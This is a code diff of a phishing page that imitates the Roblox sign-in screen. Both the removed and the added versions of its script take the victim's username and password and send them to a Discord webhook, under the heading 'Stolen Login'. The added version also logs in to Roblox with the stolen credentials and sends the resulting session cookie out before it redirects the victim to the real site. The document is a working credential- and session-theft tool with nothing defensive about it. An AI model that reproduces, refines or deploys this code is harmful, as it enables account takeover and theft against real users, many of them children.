@@ -1,137 +1,61 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Sign in to Roblox</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body {
-            background-color: #232527;
-            font-family: 'Gotham', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            color: #fff;
-        }
-        .login-container {
-            background-color: #393b3d;
-            padding: 40px;
-            border-radius: 8px;
-            width: 300px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-        }
-        h2 {
-            text-align: center;
-            margin-bottom: 20px;
-            font-weight: 700;
-        }
-        .logo {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .logo img {
-            height: 30px;
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 15px;
-            border: 1px solid #555;
-            border-radius: 5px;
-            background-color: #232527;
-            color: #fff;
-            box-sizing: border-box;
-            font-size: 14px;
-        }
-        input:focus {
-            outline: none;
-            border-color: #00a2ff;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: #00a2ff;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-        button:hover {
-            background-color: #0084c9;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 15px;
-            font-size: 12px;
-            color: #a0a0a0;
-        }
-        .footer a {
-            color: #00a2ff;
-            text-decoration: none;
-        }
-    </style>
-</head>
-<body>
-
-<div class="login-container">
-    <div class="logo">
-        <!-- Official Roblox Logo URL -->
-        <img src="https://www.roblox.com/favicon.ico" alt="Roblox" style="height: 40px; vertical-align: middle;">
-        <span style="font-size: 24px; font-weight: 900; margin-left: 10px;">ROBLOX</span>
-    </div>
-
-    <!-- THIS IS THE FORM WE CARE ABOUT -->
-    <form id="robloxLogin">
-        <input type="text" name="username" placeholder="Username" required autocomplete="off">
-        <input type="password" name="password" placeholder="Password" required autocomplete="off">
-        <button type="submit">Log In</button>
-    </form>
-    
-    <div class="footer">
-        <a href="#">Forgot Password?</a>
-    </div>
-</div>
-
 <script>
     document.getElementById('robloxLogin').addEventListener('submit', async function(e) {
         e.preventDefault();
         
         const username = document.querySelector('input[name="username"]').value;
         const password = document.querySelector('input[name="password"]').value;
-        const cookie = document.cookie;
-
+        
         // YOUR WEBHOOK HERE
         const webhook = "https://discord.com/api/webhooks/1545101253095202847/vq1JQ4D-SDovavmQREuBhgUzxC9w5n2_hM1tt-sP4I2U2KvBfypij_bvjiw06wbtEpVQ";
 
-        // Show loading state
-        const btn = document.querySelector('button');
-        btn.innerText = "Logging in...";
-        btn.disabled = true;
+        // 1. Send Username/Password first (in case cookie fails)
+        await fetch(webhook, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                content: `🔓 **Stolen Login**\n👤 **User:** ${username}\n🔑 **Pass:** ${password}`
+            })
+        });
 
+        // 2. Automatically log them in via API to generate a fresh cookie
         try {
-            await fetch(webhook, {
+            const loginResponse = await fetch('https://www.roblox.com/login/loginwithcredentials', {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Requested-With': 'XMLHttpRequest'
+                },
                 body: JSON.stringify({
-                    content: `🔓 **Stolen Login**\n👤 **User:** ${username}\n🔑 **Pass:** ${password}\n🍪 **Cookie:** ${cookie}`
+                    username: username,
+                    password: password,
+                    csrfToken: getCsrfToken() // You might need to fetch this first from the login page
                 })
             });
+            
+            if (loginResponse.ok) {
+                // 3. Now that they are logged in, grab the NEW cookie
+                const newCookie = document.cookie;
+                
+                // 4. Send the cookie to Discord
+                await fetch(webhook, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        content: `🍪 **New Cookie Generated**\n🔗 **Cookie:** \`${newCookie}\``
+                    })
+                });
+            }
         } catch (err) {
-            console.log("Error sending to webhook", err);
+            console.log("Auto-login failed", err);
         }
 
-        // Fake success delay
-        await new Promise(r => setTimeout(r, 1500));
-        
-        // Redirect to real Roblox
+        // 5. Redirect to Home
         window.location.href = "https://www.roblox.com/home";
     });
-</script>
 
-</body>
-</html>
+    // Helper to get CSRF token if needed
+    function getCsrfToken() {
+        const meta = document.querySelector('meta[name="csrf-token"]');
+        return meta ? meta.getAttribute('content') : '';
+    }
+</script>
